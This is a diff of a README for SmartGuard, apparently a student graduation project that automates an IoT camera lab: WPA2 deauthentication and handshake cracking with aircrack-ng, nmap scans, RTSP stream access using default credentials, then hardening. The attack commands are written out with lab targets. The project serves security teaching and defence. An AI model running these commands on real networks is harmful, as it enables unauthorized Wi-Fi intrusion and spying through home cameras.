@@ -1,211 +1,261 @@
 <div align="center">
 
-# 🏆 SmartGuard — IoT Security Audit Framework
+# ⚡ SmartGuard — IoT Security Audit Framework
 
 **🥇 Winner · 1st Place Graduation Project Award**
-Buraydah Colleges · Department of Cybersecurity · 2025/2026
+Buraydah Colleges · Department of Cybersecurity · 2025 / 2026
 
-[![Language](https://img.shields.io/badge/Language-Bash-green?style=flat-square&logo=gnubash)](smartguard.sh)
-[![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-blue?style=flat-square&logo=kalilinux)](https://www.kali.org)
-[![License](https://img.shields.io/badge/Use-Lab%20Only-red?style=flat-square)](#)
-[![Status](https://img.shields.io/badge/Status-Complete-brightgreen?style=flat-square)](#)
+[![Language](https://img.shields.io/badge/Shell-Bash-green?style=flat-square&logo=gnubash)](smartguard.sh)
+[![GUI](https://img.shields.io/badge/GUI-Python%20%2F%20CustomTkinter-blue?style=flat-square&logo=python)](smartguard_gui.py)
+[![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-purple?style=flat-square&logo=kalilinux)](https://www.kali.org)
+[![Version](https://img.shields.io/badge/Version-2.0-cyan?style=flat-square)](#)
+[![Lab Only](https://img.shields.io/badge/Use-Lab%20Only-red?style=flat-square)](#)
 
 </div>
 
 ---
 
-## 📌 Project Overview
+## 📌 What is SmartGuard?
 
-As IoT devices become integral to smart homes, security often lags behind convenience. This project demonstrates how weak configurations in consumer-grade IP cameras can lead to severe privacy breaches — then shows exactly how to fix them.
+SmartGuard is a **complete IoT security audit framework** that automates an entire cybersecurity lab from start to finish — replacing manual command-by-command execution with a guided, step-by-step wizard.
 
-We built **SmartGuard**, an interactive Bash framework that automates three security phases in a controlled lab environment:
-
-| Phase | Tool | Goal |
-|-------|------|------|
-| 01 · Wireless Attack | `aircrack-ng` suite | Crack WPA2 & gain LAN access |
-| 02 · Reconnaissance | `nmap` | Discover IoT devices & open ports |
-| 03 · Hardening Verify | Custom checklist + `nmap` | Confirm Defense-in-Depth applied |
+It was built as part of our graduation project to demonstrate how **default configurations in IoT devices** (IP cameras, smart locks, smart plugs, and more) expose homes to real-world cyberattacks — and exactly how to fix them.
 
 ---
 
-## 🎯 Objectives
+## 🎯 What IoT Devices Can Be Tested?
 
-- Perform wireless deauthentication attacks to capture WPA2 handshakes
-- Crack weak passwords using dictionary attacks (`rockyou.txt`)
-- Map IoT devices on the internal network after gaining access
-- Exploit unencrypted RTSP video streams on IP cameras
-- Apply and verify a **Defense-in-Depth** hardening strategy
-- Measure attack surface reduction after hardening
+SmartGuard's methodology applies to **any IoT device connected to Wi-Fi**:
+
+| Device | Common Vulnerability |
+|--------|---------------------|
+| 📷 IP Cameras (Hikvision, Dahua, etc.) | RTSP stream exposed, default `admin:admin` |
+| 🔐 Smart Door Locks | Weak Wi-Fi auth, unencrypted MQTT traffic |
+| 💡 Smart Bulbs & Plugs | HTTP control panel on port 80, no auth |
+| 📡 Wi-Fi Routers | WPA2 weak passwords, WPS enabled |
+| 🌡️ Smart Sensors (temperature, motion) | Telnet open (port 23), no firmware signing |
+| 🖨️ Network Printers | Open ports 9100 / 631, no access control |
+
+> In our lab, we used an **IP camera** as the primary target — it represents the worst-case scenario: an attacker gaining visual access to a private home.
 
 ---
 
 ## 🏗️ Lab Network Topology
 
 ```
-[ Attacker Machine (Kali Linux) ]
-        │
-        │  ① Deauth + Handshake Capture (aircrack-ng)
-        ▼
-[ Wi-Fi Router ] ──── [ IP Camera (192.168.8.186) ]
-        │                       │
-        │                  Port 80  (HTTP Admin)
-        │                  Port 554 (RTSP Stream)  ← ② Exploited
-        │
-        └─ ③ After Hardening: Camera moved to isolated IoT VLAN
+┌─────────────────────────────────────────────────────────────────────┐
+│  BEFORE Hardening                                                    │
+│                                                                      │
+│  [ Attacker — Kali Linux ]                                           │
+│          │                                                           │
+│          │  ① Deauth + WPA2 Handshake (aircrack-ng)                  │
+│          ▼                                                           │
+│  [ Wi-Fi Router ]──────────────[ IP Camera 192.168.8.186 ]          │
+│   (password: 12345678)           Port 80  — HTTP admin panel         │
+│                                  Port 554 — RTSP live video ← hijack │
+└─────────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────────┐
+│  AFTER Hardening (Defense-in-Depth)                                  │
+│                                                                      │
+│  [ Attacker ]  ✗ Cannot crack — strong WPA2 password                │
+│                ✗ Cannot access — RTSP disabled (port 554 closed)    │
+│                ✗ Cannot reach — Camera isolated on IoT VLAN         │
+│                ✗ Cannot find  — SSID hidden                         │
+└─────────────────────────────────────────────────────────────────────┘
 ```
 
 ---
 
-## ⚡ Attack Methodology
+## ⚡ Attack Methodology — 15-Step Wizard
 
-### Phase 01 · Wireless Network Exploitation
+SmartGuard v2.0 replaces all manual steps with a **guided wizard**. Each step explains what is happening and why before executing the command.
+
+### Phase 01 · Wireless Attack (Steps 1–8)
+
+```
+Step 01  Select Wireless Interface         identify your Wi-Fi adapter
+Step 02  Kill Interfering Processes        airmon-ng check kill
+Step 03  Enable Monitor Mode               airmon-ng start wlan0  →  wlan0mon
+Step 04  Scan Surrounding Networks         airodump-ng wlan0mon
+Step 05  Set Target (BSSID & Channel)      lock onto the router
+Step 06  Start Handshake Capture  ──┐      airodump-ng --bssid ... -w capture
+Step 07  Deauth Attack            ──┘  ←  aireplay-ng --deauth 20  (kicks clients)
+         [Step 06 captures the handshake the moment clients reconnect]
+Step 08  Crack Password                    aircrack-ng + rockyou.txt
+```
+
+**Result:** `KEY FOUND! [ 12345678 ]` — cracked in under 30 seconds.
+
+#### Key Command Reference
 
 ```bash
-# Kill processes that interfere with monitor mode
+# Step 02 — kill interfering processes
 sudo airmon-ng check kill
 
-# Enable monitor mode on wireless interface
+# Step 03 — enable monitor mode
 sudo airmon-ng start wlan0
 
-# Scan for surrounding networks — identify target BSSID & channel
+# Step 04 — scan all nearby networks
 sudo airodump-ng wlan0mon
 
-# Capture WPA2 4-way handshake from target router
-sudo airodump-ng --bssid 1E:4A:44:D1:44:4B --channel 6 -w handshake_capture wlan0mon
+# Step 06 — capture handshake (run first, keep running)
+sudo airodump-ng --bssid 1E:4A:44:D1:44:4B --channel 6 -w capture wlan0mon
 
-# Force client to reconnect (triggers handshake re-broadcast)
+# Step 07 — deauth: kick clients so they reconnect and broadcast the handshake
 sudo aireplay-ng --deauth 20 -a 1E:4A:44:D1:44:4B -c FF:FF:FF:FF:FF:FF wlan0mon
 
-# Dictionary brute-force against captured handshake
-sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake_capture-01.cap
+# Step 08 — dictionary crack against the captured handshake
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
 ```
-
-**Result:** `KEY FOUND! [ 12345678 ]` — default weak password cracked in seconds.
 
 ---
 
-### Phase 02 · Network Reconnaissance & Device Discovery
+### Phase 02 · Network Reconnaissance (Steps 9–11)
+
+```
+Step 09  Host Discovery     nmap -sn 192.168.8.0/24    → find IP camera
+Step 10  Port Scan          nmap -sV -p 80,554,...     → map open services
+Step 11  RTSP Hijack        rtsp://admin:admin@192.168.8.186:554/live  → VLC
+```
+
+**Open ports found:**
+
+| Port | Service | Risk | Finding |
+|------|---------|------|---------|
+| 80 | HTTP | 🟡 Medium | Admin panel, no HTTPS, default credentials |
+| 554 | RTSP | 🔴 High | Live video stream, unencrypted, no authentication |
 
 ```bash
-# Host discovery — map all active devices on the local subnet
+# Step 09 — discover all devices on the LAN
 sudo nmap -sn 192.168.8.0/24
 
-# Service version scan on the IP camera — focus on web & RTSP ports
+# Step 10 — detailed scan on the camera
 sudo nmap -sV -p 80,554,8080,443,22,23,21 192.168.8.186
 
-# Deep scan with OS detection and banner grabbing
-sudo nmap -sV -O --script=http-title,banner -p 80,554 192.168.8.186
-```
-
-**Open ports found on camera:**
-
-| Port | Protocol | Risk | Finding |
-|------|----------|------|---------|
-| 80   | HTTP     | ⚠️ Medium | Admin panel, no HTTPS, default credentials |
-| 554  | RTSP     | 🔴 High   | Live video stream, unencrypted, no auth |
-
----
-
-### Phase 03 · Exploitation — Video Stream Hijack
-
-```
-# Access live feed using default credentials over exposed RTSP
+# Step 11 — access live video feed using default credentials
+# Open this URL in VLC → Media → Open Network Stream
 rtsp://admin:admin@192.168.8.186:554/live
 ```
 
-Open in **VLC Media Player** → full unauthorized access to home camera feed achieved.
-
 ---
 
-## 🛡️ Defense & Hardening (Mitigation)
+### Phase 03 · Hardening & Verification (Steps 12–14)
 
-After demonstrating the attacks, we implemented a **Defense-in-Depth** strategy:
+```
+Step 12  Apply Hardening Measures    checklist of 5 controls
+Step 13  Verify with Nmap            re-scan confirms ports are closed
+Step 14  Hardening Score             shows before/after comparison
+```
 
-### Actions Taken
+**5 Controls Applied:**
 
-1. **Credential Hardening** — Changed default `admin:admin` to a strong, unique password
-2. **Protocol Disabling** — Disabled RTSP (Port 554) entirely from camera settings
-3. **Network Segmentation** — Moved IoT devices to a dedicated isolated VLAN
-4. **SSID Hiding** — Hid the IoT network SSID to reduce passive reconnaissance
-
-### Post-Hardening Validation
+1. **Credential Hardening** — Changed all default passwords (camera + router)
+2. **Protocol Disabling** — Disabled RTSP (port 554) on the camera
+3. **Network Segmentation** — Moved camera to a dedicated IoT VLAN
+4. **Hidden SSID** — IoT network is no longer broadcast
+5. **HTTPS Enforcement** — Admin panel now requires encrypted connection
 
 ```bash
-# Verify RTSP is disabled after hardening
+# Step 13 — verify port 554 is now closed after hardening
 sudo nmap -p 554 192.168.8.186
-# Expected: 554/tcp  closed  rtsp
+# Expected output: 554/tcp  closed  rtsp
 ```
 
 ---
 
-## 📊 Results
+### Report · Step 15
 
-| Security Control | Before Hardening | After Hardening |
-|-----------------|-----------------|-----------------|
-| Wi-Fi Password | `12345678` (weak) | Strong & unique ✅ |
-| Camera Password | `admin:admin` (default) | Changed ✅ |
-| RTSP Port 554 | Open & exposed 🔴 | Closed ✅ |
-| HTTP Port 80 | Open, no HTTPS 🟡 | Restricted ✅ |
-| Network | Shared with main LAN 🔴 | Isolated VLAN ✅ |
-| SSID Visibility | Publicly broadcast 🟡 | Hidden ✅ |
-| **Overall Risk** | **HIGH 🔴** | **LOW 🟢** |
-
-> **Attack surface reduced by ~80%** in post-hardening verification scans.
+Generates a full text report saved to disk with all findings, commands, and results.
 
 ---
 
-## 🔧 SmartGuard Tool
+## 📊 Before vs. After
 
-This project includes **SmartGuard** (`smartguard.sh`) — an interactive Bash framework we developed to automate the entire audit workflow.
+| Security Control | Before Hardening | After Hardening |
+|-----------------|-----------------|-----------------|
+| Wi-Fi Password | `12345678` — weak | Strong & unique ✅ |
+| Camera Credentials | `admin:admin` — default | Changed ✅ |
+| Port 554 (RTSP) | Open — video exposed 🔴 | Closed ✅ |
+| Port 80 (HTTP) | Open — no HTTPS 🟡 | Restricted ✅ |
+| Network | Shared LAN 🔴 | Isolated VLAN ✅ |
+| SSID | Publicly broadcast 🟡 | Hidden ✅ |
+| **Risk Level** | **HIGH 🔴** | **LOW 🟢** |
 
-### Features
+> **~80% reduction in attack surface** confirmed by post-hardening nmap scan.
 
-- Colored terminal UI with progress indicators
-- Step-by-step guided execution with confirmations
-- Automatic session logging to `/tmp/smartguard_*.log`
-- Post-session report generation
-- Dependency checker (aircrack-ng, nmap, xterm)
-- Hardening score calculator (0–5 checks with % reduction metric)
+---
 
-### Installation & Usage
+## 🖥️ SmartGuard GUI (v2.0)
+
+A full dark-theme desktop application built with Python + CustomTkinter.
+
+**Features:**
+- 15-step guided wizard — one screen per step
+- Explains *what* and *why* before every command
+- Step 06 & 07 work together: capture stays running while deauth fires
+- Live progress bar tracking current step
+- Terminal-style output with color coding (green = safe, red = vulnerable)
+- On **Linux (Kali)** → executes real commands
+- On **Windows** → demo/presentation mode with simulated output
+- Hardening score calculator with before/after comparison
+- Auto-saves session report to text file
+
+### Installation & Run
 
 ```bash
 # Clone the repository
 git clone https://github.com/i39F/IoT-SmartGuard-Security.git
 cd IoT-SmartGuard-Security
 
-# Make executable
-chmod +x smartguard.sh
+# Install Python dependencies
+pip install customtkinter
 
-# Run with root privileges (required for airmon-ng and nmap)
-sudo ./smartguard.sh
-```
+# Run the GUI (on Kali Linux use sudo for full functionality)
+sudo python3 smartguard_gui.py
 
-### Main Menu
-
-```
-  MAIN MENU  — اختر المرحلة
-  ──────────────────────────────────────────────────────────────
-  [1]  Phase 01 → Wireless Attack & Handshake Capture
-  [2]  Phase 02 → Network Reconnaissance & Port Scan
-  [3]  Phase 03 → Hardening Verification Checklist
-  [4]  Full Run → تشغيل المراحل الثلاث تسلسلياً
-  [5]  Report  → توليد تقرير الجلسة
-  [6]  Check Deps → فحص الأدوات المثبتة
-  [0]  خروج
+# Or run the original Bash CLI version
+sudo bash smartguard.sh
 ```
 
 ### Requirements
 
 ```bash
-# Install all dependencies on Kali Linux / Debian
+# Kali Linux / Debian — install tools
 sudo apt update && sudo apt install -y aircrack-ng nmap xterm
 
-# Decompress wordlist if needed
+# Decompress the wordlist if needed
 sudo gunzip /usr/share/wordlists/rockyou.txt.gz
 ```
 
-> ⚠️ **For use in authorized lab environments only.** Unauthorized use on real networks is illegal.
+---
+
+## 📁 Repository Structure
+
+```
+IoT-SmartGuard-Security/
+│
+├── smartguard_gui.py        # GUI wizard — Python / CustomTkinter (v2.0)
+├── smartguard.sh            # CLI framework — Bash (original v1.0)
+├── README.md                # This file
+│
+└── docs/
+    └── Graduation_Project_Report.pdf   # Full written report
+```
+
+---
+
+## 💡 Suggestions & Future Work
+
+| Idea | Description |
+|------|-------------|
+| 📱 Mobile App | Android version of the wizard for field audits |
+| 🌐 Web Dashboard | Flask-based interface accessible from a browser |
+| 🤖 Auto-Target | Auto-detect camera IP from nmap and populate all fields |
+| 📄 PDF Report | Export session report as formatted PDF |
+| 🔔 Notifications | Alert when handshake is captured (sound / popup) |
+| 🔌 WPS Testing | Add WPS PIN attack module (reaver / bully) |
+| 📡 Bluetooth IoT | Extend to BLE device scanning (smart locks, wearables) |
 
 ---
 
@@ -213,7 +263,7 @@ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
 
 | Name | Role |
 |------|------|
-| Sulaiman Almanea | Team Lead & Attack Phase |
+| Sulaiman Almanea | Team Lead · Attack Phase |
 | Muath Alyhya | Wireless Security & Testing |
 | Abdulaziz Alharbi | Network Reconnaissance |
 | Majed Alghrras | Hardening & Documentation |
@@ -223,15 +273,22 @@ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
 
 ---
 
-## 📁 Repository Structure
+<div dir="rtl">
 
-```
-IoT-SmartGuard-Security/
-├── smartguard.sh           # Main audit framework (Bash)
-├── README.md               # This file
-└── docs/
-    └── Graduation_Project_v7.0.pdf   # Full written report
-```
+## نبذة عن المشروع
+
+**SmartGuard** هو إطار عمل أمني متكامل يُؤتمت عملية اختبار اختراق أجهزة IoT بالكامل — من اختراق شبكة Wi-Fi وصولاً إلى الوصول لبث الكاميرا الحية، ثم تطبيق وتحقق خطة التحصين الأمني.
+
+يستبدل الأداة الطريقة اليدوية (أمر بأمر) بـ **wizard تفاعلي من 15 خطوة** تشرح كل خطوة ماذا تفعل ولماذا قبل تنفيذها.
+
+### الفريق
+سليمان المنيع · معاذ اليحيا · عبدالعزيز الحربي · ماجد الغراس · منصور السويه
+
+**المشرف:** د. أحمد العرابي · قسم الأمن السيبراني · كليات بريدة
+
+> ⚠️ للاستخدام في بيئات المختبر المُخوَّلة فقط.
+
+</div>
 
 ---
 
@@ -239,40 +296,6 @@ IoT-SmartGuard-Security/
 
 **Buraydah Colleges · Cybersecurity Department · Final Year Project 2025/2026**
 
-*"Securing Smart Homes — One Vulnerability at a Time"*
-
-</div>
-
----
-
-<div dir="rtl">
-
-## نبذة عن المشروع
-
-يُعالج هذا المشروع إشكالية أمن أجهزة إنترنت الأشياء (IoT) في البيئات المنزلية الذكية، إذ باتت هذه الأجهزة هدفاً رئيسياً للمهاجمين نتيجة ضعف إعداداتها الافتراضية.
-
-قمنا ببناء أداة **SmartGuard** — إطار عمل تفاعلي مكتوب بـ Bash يُنفّذ ثلاث مراحل أمنية متكاملة في بيئة مختبر خاضعة للسيطرة:
-
-- **المرحلة الأولى:** اختراق الشبكة اللاسلكية عبر التقاط WPA2 Handshake وكسر كلمة المرور
-- **المرحلة الثانية:** استطلاع الشبكة الداخلية واكتشاف الأجهزة والمنافذ المفتوحة
-- **المرحلة الثالثة:** التحقق من تطبيق إجراءات التحصين ورفع تقرير بالنتائج
-
-### النتيجة
-
-تمكّن الفريق من اختراق الكاميرا كاملاً (كسر كلمة مرور الشبكة + الوصول للبث المباشر) ثم تطبيق استراتيجية **Defense-in-Depth** التي أسفرت عن **تقليص سطح الهجوم بنسبة 80%**.
-
-### الفريق
-
-| الاسم | الجهة |
-|-------|-------|
-| سليمان المنيع | قائد الفريق |
-| معاذ اليحيا | اختبار الاختراق اللاسلكي |
-| عبدالعزيز الحربي | استطلاع الشبكات |
-| ماجد الغراس | التحصين والتوثيق |
-| منصور السويه | تطوير الأداة والتقارير |
-
-**المشرف:** د. أحمد العرابي · قسم الأمن السيبراني · كليات بريدة
-
-> ⚠️ **للاستخدام في بيئات المختبر المُخوَّلة فقط.** الاستخدام غير المُصرَّح به على شبكات حقيقية مُجرَّم قانونياً.
+*"From default credentials to zero trust — one step at a time."*
 
 </div>
